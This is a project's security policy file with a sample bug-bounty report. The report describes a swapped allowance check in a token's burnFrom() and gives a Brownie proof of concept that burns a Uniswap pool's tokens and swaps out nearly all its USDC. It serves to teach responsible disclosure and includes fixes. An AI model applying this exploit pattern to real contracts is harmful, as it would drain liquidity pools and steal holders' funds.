# Security Policy

## Supported Versions

versions that being supported with security updates.

| Version | Supported          |
| ------- | ------------------ |
| 1.x.x   | :white_check_mark: |

## Reporting a Vulnerability

<p align="center"> 
  <b>SAMPLE REPORT BELOW</b>
</p>

# Impact

**CRITICAL!** Almost all USDC liquidity on the REKT/USDC uniswap pool can be stolen, due to an authorization issue with `burnFrom()` on the REKT token.

# Background

Uniswap v2 pools get the prices for their swaps by comparing the relative amounts of each of the two tokens that they hold. If the pool holds very little of token A, and a lot of token B, then it only takes a little of token A to buy a lot of token B. 

Currently REKT and USDC are fairly priced in the pool. If there were to suddenly be very little REKT in the pool, but the same amount of USDC, then very little REKT would be able to buy a lot of USDC.

# Vulnerability

The burnFrom() function in the REKT token contract has a bug in the _allowances check. The `sender` and `from` arguments are in the incorrect order. 

Here is the current `burnFrom()` code:

```javascript
function burnFrom(address from, uint256 amount) external {
  require(_allowances[msg.sender][from] >= amount);
  require(_balances[from] >= amount);
  _approve(msg.sender, from, _allowances[msg.sender][from] - amount);
  _burn(from, amount);
}
```

You will notice that the `from` mapping key is in a different place when compared with the correct check used by transferFrom().

```javascript
require(_allowances[from][spender] >= amount);
```

Because the `from` and `to` parameters are switched, anyone can be able to burn another addresses's tokens by allowing that address to spend their tokens.

This lets the attacker burn almost all REKT tokens from the uniswap pool, and then swap for almost all the USDC in pool.

# POC

_This POC is written in Brownie._

```python
usdt = Contract.from_explorer('...')
rekt = Contract.from_explorer('...')
uniswap_router = Contract.from_explorer('...')
rekt_usdc_pool = Contract.from_explorer('...')


#1. The attack will need to swap in both directions
usdt.approve(uniswap_router, 1e70)
rekt.approve(uniswap_router, 1e70)

#2. This will allow the attacker to burn the pool's tokens
rekt.approve(rekt_usdc_pool, 1e70)

#3. Attacker purchases a small amount of REKT
uniswap_router.swapExactETHForTokens(...[weth,rekt]...)

#4. Attacker burns almost all the pool's REKT
pool_balance = rekt.balanceOf(rekt_usdc_pool)
rekt.burnFrom(rekt_usdc_pool, pool_balance-1)

#5. Attacker syncs the pool, so that it uses the new amounts
rekt_usdc_pool.sync()

#6. Attacker swaps a little REKT for almost all the USDC
uniswap_router.swapExactTokensForTokens(...[rekt,usdc]...)

#7. Attacker now owns the USDC
print(usdc.balanceOf(attacker) // 1e6) # 19,670,432 USDC
```

# Recommendations

1. The current token contract is non-upgradable. It will need to be replaced with a new contract that has this bug fixed, and holders will need to be migrated to it.
2. The REKT project may want to consider having any LP holders known to the project quietly pull their liquidity, to reduce the funds at risk. After doing this, if the funds at risk are still large, the project may want to consider a careful, dark forest / MEV resistant whitehack to secure the remainder of the pool USDC for distribution back to users.
